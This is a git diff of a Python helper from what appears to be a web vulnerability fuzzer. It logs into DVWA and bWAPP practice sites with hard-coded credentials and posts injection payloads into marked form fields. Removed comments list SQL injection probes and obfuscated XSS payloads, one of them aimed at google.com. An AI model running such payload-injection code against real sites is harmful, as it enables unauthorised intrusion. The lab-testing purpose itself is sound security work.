@@ -2,14 +2,15 @@ import requests
 from .parse import postParser
 # from parse import postParser
 # from ..models import xss
-from requests.utils import requote_uri
+# from requests.utils import requote_uri
+from urllib.parse import quote as requote_uri
 from bs4 import BeautifulSoup as bs4
 import re
 
 
-URL = "http://47.245.99.142/login.php"
+URL = "https://bwapp.hakhub.net/login.php"
 
-def createSession(url, username="admin", password="password"):
+def createSessionDvwa(url, username="admin", password="password"):
     s = requests.Session()
     soup = bs4(s.get(url).content, "html.parser")
     hidden = soup.find("input", type="hidden")
@@ -18,8 +19,14 @@ def createSession(url, username="admin", password="password"):
     s.post(url, data=payload)
     return s
 
+def createSessionBwapp(url, username="ikantongkol", password="hacker", security_level=0):
+    s = requests.Session()
+    payload = {"login": username, "password": password, "security_level":security_level, "form": "submit"}
+    s.post(url, data=payload)
+    return s
+
 def findInput(url, session = None):
-    # s = createSession(URL)
+    # s = createSessionBwapp(URL)
     # content = s.get(url).content
     if (session is not None):
         content = session.get(url).content
@@ -32,7 +39,7 @@ def findInput(url, session = None):
 def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
     context_data = {}
     if (login_dvwa):
-        session = createSession(URL)
+        session = createSessionBwapp(URL)
         input_id = findInput(url, session)
     else:
         input_id = findInput(url) # type list
@@ -47,21 +54,12 @@ def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
 # post request -> url, payloads, data (x-urlformencoded)
 
 def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False):
-    # get each value from data.values()
-    # from value, check whether it has "$$" or not
-    #   if "$$" exists, change to payload
-    #   else, continue to another value
-    # return data dictionary filled with payloads
-
-    # initial_data = {"ie": "", "gl": "$$"}
-
-    # data = [{"ie": payload1, "hl": "a", "h3": "b"}, {"ie": payload2, "hl": "a", "h3": "b"}]
-    
     if (login_dvwa):
-        session = createSession(URL)
+        session = createSessionBwapp(URL)
     else:
         session = requests
     current_data = data.copy()
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
     for key, value in data.items():
         if (re.search("\$(.*?)\$", value) != None):
             v = postParser(value, payloads)
@@ -77,7 +75,7 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
     
     result = []
     for index, value_dict in enumerate(processed_data):
-        response = session.post(url, json = value_dict)
+        response = session.post(url, data = value_dict, headers=headers)
         status_code = response.status_code
         try:
             content_length = response.headers["Content-Length"]
@@ -85,10 +83,11 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
             content_length = len(response.text)
         
         result.append([payloads[index], status_code, content_length]) 
-    print(len(processed_data), len(payloads))
+        content_length = "0"
+        status_code = 0
     return result
 
 
 # if __name__ == "__main__":
-    # post_request("http://47.245.99.142/vulnerabilities/sqli/", [requote_uri(payload) for payload in ["ORDER BY 4--", "and (select substring(@@version,1,1))='X"]], {"id": "$$", "Submit": "Submit"}, login_dvwa=True)
-# post_request("http://google.com", ["<script>alert('123')</script>", '-prompt(8)-', "'-prompt(8)-'", '";a=prompt,a()//', "';a=prompt,a()//", '\'-eval("window[\'pro\'%2B\'mpt\'](8)")-\'', '-eval("window[\'pro\'%2B\'mpt\'](8)")-', '"onclick=prompt(8)>"@x.y', '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y'], {"data": "data", "d": "$$"})
+    # payload 
+    # post_request("https://bwapp.hakhub.net/sqli_6.php", payload, {"title": "$$", "action": "search"}, login_dvwa=True)
